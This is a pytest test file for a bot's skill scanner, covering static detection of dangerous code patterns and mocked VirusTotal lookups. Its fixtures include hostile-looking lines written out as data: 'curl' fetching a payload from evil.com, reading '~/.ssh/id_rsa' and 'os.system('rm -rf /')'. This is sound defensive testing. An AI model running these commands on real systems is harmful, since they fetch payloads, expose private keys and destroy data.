"""Tests for sygen_bot.skills.scanner — static analysis + VirusTotal."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

from sygen_bot.skills.scanner import (
    ScanFinding,
    ScanResult,
    VTResult,
    _sha256_file,
    scan_skill,
    scan_static,
    scan_virustotal,
)


def _mock_response(status_code: int = 200, json_data: object = None) -> MagicMock:
    """Create a mock httpx.Response (sync .json(), sync .status_code)."""
    resp = MagicMock()
    resp.status_code = status_code
    resp.json.return_value = json_data
    return resp


# ---------------------------------------------------------------------------
# Static analysis tests
# ---------------------------------------------------------------------------


class TestStaticScan:
    def test_detects_eval(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("result = eval(user_input)\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "eval" in f.description for f in findings)

    def test_detects_exec(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("exec(code)\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "exec" in f.description for f in findings)

    def test_detects_compile(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("obj = compile(source, '<string>', 'exec')\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "compile" in f.description for f in findings)

    def test_detects_dunder_import(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("mod = __import__('os')\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "__import__" in f.description for f in findings)

    def test_detects_importlib(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("import importlib\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "importlib" in f.description for f in findings)

    def test_detects_marshal_loads(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("data = marshal.loads(blob)\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "marshal" in f.description for f in findings)

    def test_detects_pickle(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("obj = pickle.load(f)\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "critical" and "pickle" in f.description for f in findings)

    def test_detects_curl_warning(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.sh").write_text("curl https://evil.com/payload\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "warning" and "curl" in f.description for f in findings)

    def test_detects_subprocess_warning(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("import subprocess\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "warning" and "subprocess" in f.description for f in findings)

    def test_detects_ssh_path(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("key = open('~/.ssh/id_rsa').read()\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "warning" and ".ssh" in f.description for f in findings)

    def test_detects_base64_decode(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("x = base64.b64decode(payload)\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "warning" and "base64" in f.description for f in findings)

    def test_detects_os_system(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("os.system('rm -rf /')\n")
        findings = scan_static(tmp_path)
        assert any(f.severity == "warning" and "os.system" in f.description for f in findings)

    def test_clean_file_no_findings(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("print('hello world')\nx = 1 + 2\n")
        findings = scan_static(tmp_path)
        assert findings == []

    def test_finding_has_correct_line_number(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("# safe\n# safe\neval('bad')\n")
        findings = scan_static(tmp_path)
        assert findings[0].line == 3

    def test_scans_root_when_no_scripts_dir(self, tmp_path: Path):
        (tmp_path / "main.py").write_text("eval('x')\n")
        findings = scan_static(tmp_path)
        assert len(findings) >= 1
        assert findings[0].file == "main.py"

    def test_skips_binary_extensions(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "module.pyc").write_bytes(b"\x00eval()")
        findings = scan_static(tmp_path)
        assert findings == []

    def test_multiple_findings_per_file(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("eval('a')\nexec('b')\n")
        findings = scan_static(tmp_path)
        assert len(findings) >= 2


# ---------------------------------------------------------------------------
# SHA-256 helper
# ---------------------------------------------------------------------------


class TestSha256:
    def test_sha256_file(self, tmp_path: Path):
        f = tmp_path / "test.txt"
        f.write_text("hello")
        h = _sha256_file(f)
        assert len(h) == 64
        assert h == "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"


# ---------------------------------------------------------------------------
# VirusTotal tests (mocked)
# ---------------------------------------------------------------------------


class TestVirusTotalScan:
    async def test_vt_clean_result(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("print('hi')")

        resp = _mock_response(json_data={
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 0,
                        "suspicious": 0,
                        "undetected": 70,
                        "harmless": 2,
                    }
                }
            }
        })

        with patch("sygen_bot.skills.scanner.httpx.AsyncClient") as mock_client_cls:
            client_instance = AsyncMock()
            client_instance.get = AsyncMock(return_value=resp)
            client_instance.__aenter__ = AsyncMock(return_value=client_instance)
            client_instance.__aexit__ = AsyncMock(return_value=False)
            mock_client_cls.return_value = client_instance

            results = await scan_virustotal(tmp_path, "fake-api-key")

        assert len(results) == 1
        vt = next(iter(results.values()))
        assert vt.is_clean
        assert vt.detections == 0

    async def test_vt_detection_found(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "evil.py").write_text("bad code")

        resp = _mock_response(json_data={
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 3,
                        "suspicious": 1,
                        "undetected": 60,
                        "harmless": 8,
                    }
                }
            }
        })

        with patch("sygen_bot.skills.scanner.httpx.AsyncClient") as mock_client_cls:
            client_instance = AsyncMock()
            client_instance.get = AsyncMock(return_value=resp)
            client_instance.__aenter__ = AsyncMock(return_value=client_instance)
            client_instance.__aexit__ = AsyncMock(return_value=False)
            mock_client_cls.return_value = client_instance

            results = await scan_virustotal(tmp_path, "fake-api-key")

        vt = next(iter(results.values()))
        assert not vt.is_clean
        assert vt.detections == 4

    async def test_vt_404_treated_as_clean(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "new.py").write_text("x = 1")

        resp = _mock_response(status_code=404)

        with patch("sygen_bot.skills.scanner.httpx.AsyncClient") as mock_client_cls:
            client_instance = AsyncMock()
            client_instance.get = AsyncMock(return_value=resp)
            client_instance.__aenter__ = AsyncMock(return_value=client_instance)
            client_instance.__aexit__ = AsyncMock(return_value=False)
            mock_client_cls.return_value = client_instance

            results = await scan_virustotal(tmp_path, "fake-api-key")

        vt = next(iter(results.values()))
        assert vt.is_clean

    async def test_vt_http_error_skips_gracefully(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("x = 1")

        with patch("sygen_bot.skills.scanner.httpx.AsyncClient") as mock_client_cls:
            client_instance = AsyncMock()
            client_instance.get = AsyncMock(side_effect=httpx.ConnectError("fail"))
            client_instance.__aenter__ = AsyncMock(return_value=client_instance)
            client_instance.__aexit__ = AsyncMock(return_value=False)
            mock_client_cls.return_value = client_instance

            results = await scan_virustotal(tmp_path, "fake-api-key")

        assert results == {}


# ---------------------------------------------------------------------------
# Combined scan
# ---------------------------------------------------------------------------


class TestScanSkill:
    async def test_scan_skill_clean(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("print('ok')\n")

        result = await scan_skill(tmp_path)
        assert result.is_safe
        assert result.static_findings == []
        assert result.vt_results == {}
        assert "clean" in result.summary.lower()

    async def test_scan_skill_with_findings(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("eval('bad')\n")

        result = await scan_skill(tmp_path)
        assert not result.is_safe
        assert len(result.static_findings) >= 1

    async def test_scan_skill_skips_vt_without_key(self, tmp_path: Path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "run.py").write_text("x = 1\n")

        result = await scan_skill(tmp_path, vt_api_key=None)
        assert result.vt_results == {}


# ---------------------------------------------------------------------------
# ScanResult properties
# ---------------------------------------------------------------------------


class TestScanResult:
    def test_is_safe_no_findings(self):
        r = ScanResult(skill_name="test")
        assert r.is_safe

    def test_is_safe_with_warning_only(self):
        r = ScanResult(
            skill_name="test",
            static_findings=[
                ScanFinding(
                    file="f.py", line=1, pattern="curl",
                    severity="warning", description="curl",
                )
            ],
        )
        assert r.is_safe  # warnings alone don't make it unsafe

    def test_not_safe_with_critical(self):
        r = ScanResult(
            skill_name="test",
            static_findings=[
                ScanFinding(
                    file="f.py", line=1, pattern="eval",
                    severity="critical", description="eval",
                )
            ],
        )
        assert not r.is_safe

    def test_not_safe_with_vt_detection(self):
        r = ScanResult(
            skill_name="test",
            vt_results={"f.py": VTResult(sha256="abc", detections=2, total_engines=72, is_clean=False)},
        )
        assert not r.is_safe

    def test_summary_clean(self):
        r = ScanResult(skill_name="test")
        assert "clean" in r.summary.lower()

    def test_summary_with_findings(self):
        r = ScanResult(
            skill_name="test",
            static_findings=[
                ScanFinding(file="f.py", line=1, pattern="eval", severity="critical", description="eval"),
                ScanFinding(file="f.py", line=2, pattern="curl", severity="warning", description="curl"),
            ],
        )
        assert "1 critical" in r.summary
        assert "1 warning" in r.summary
